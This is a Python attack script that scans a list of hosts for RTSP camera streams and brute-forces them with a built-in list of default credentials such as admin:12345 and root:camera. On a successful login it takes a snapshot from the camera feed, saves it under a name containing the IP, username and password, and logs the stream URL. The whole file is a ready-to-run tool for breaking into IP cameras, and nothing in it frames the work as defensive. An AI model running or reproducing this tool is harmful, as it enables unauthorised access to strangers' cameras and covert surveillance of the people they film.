import socket
from sys import argv, exit
from time import sleep
from cv2 import VideoCapture, imwrite

def create_describe_packet(CRED,IP,PATH):
	global DESCRIBEPACKET
	DESCRIBEPACKET =  'DESCRIBE rtsp://%s@%s%s RTSP/1.0\r\n' % (CRED,IP,PATH)
	DESCRIBEPACKET += 'CSeq: 2\r\n'
	DESCRIBEPACKET += 'Accept: application/sdp\r\n'
	DESCRIBEPACKET += 'User-Agent: Mozilla/5.0\r\n\r\n'
	return DESCRIBEPACKET

def rtsp_connect(DESCRIBEPACKET, IP, PORT):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(TIMEOUT)
	s.connect((IP, PORT))
	s.sendto(DESCRIBEPACKET.encode(),(IP, PORT))
	data = repr(s.recv(1024))
	s.close()
	return data

def logging(url):
	with open('result.txt', 'a') as file:
		file.write(url + '\n')



def get_capture(url):
	vcap = VideoCapture(url)
	ret, frame = vcap.read()
	ip = url.split('/')[2].split('@')[1]
	usr = url.split('/')[2].split('@')[0].split(':')[0]
	pwd = url.split('/')[2].split('@')[0].split(':')[1]
	path = url.split('/')[3]
	imwrite('pics/%s_%s_%s_%s.jpg' % (ip, usr, pwd, path), frame)
	print(' ...[+] Snapshot was downloaded! ' + url)

if __name__ == '__main__':

	DESCRIBEPACKET = ""
	TIMEOUT = 5
	PORT = 554
	CRED = '''user:user
admin:12345
root:root
admin:123456
Admin:123456
admin:admin
admin:9999
admin:1234
root:camera
Admin:1234
admin:fliradmin
root:system
root:admin
root:Admin
admin:jvc
admin:meinsm
admin:4321
admin:1111111
admin:password
root:ikwd
supervisor:supervisor
ubnt:ubnt
admin:wbox123'''
	CRED = CRED.split('\n')

	with open("routes.txt", "r") as routes:
		ROUTES = routes.read().split()
	with open("hosts.txt", "r") as hosts:
		HOSTS = hosts.read().split()

	for (line, host) in enumerate(HOSTS):
		state = False
		print("[%s/%d] Working with %s" % (line+1, len(HOSTS), host))
		for route in ROUTES:
			try:
				create_describe_packet('', host, route)
				data = rtsp_connect(DESCRIBEPACKET, host, PORT)
				if '404 Not Found' not in data and '\x15\x00\x00\x00\x02\x02' not in data and '400' not in data:
					print(' ...[+] Starting bruteforce')
					for (i,cred) in enumerate(CRED):
						create_describe_packet(cred, host, route)
						data = rtsp_connect(DESCRIBEPACKET, host, PORT)
						if '401 Unauthorized' not in data:
							url = "rtsp://%s@%s%s" % (cred, host, route)
							print(' ...[+] Sucssesful! ' + url)
							get_capture(url)
							logging(url)
							state = True
							break
						if i+1 == len(CRED):
							url = 'rtsp://' + host + route
							print(' ...[+] Bruteforce has failed')
							logging(url)
							state = True
							break
				if state: break
			except KeyboardInterrupt:
				print(" ...[-] Terminated by user...")
				exit()
			except socket.timeout:
				print(" ...[-] Socket timeout")
				break
			except:
				print(" ...[-] Connection error")
				break
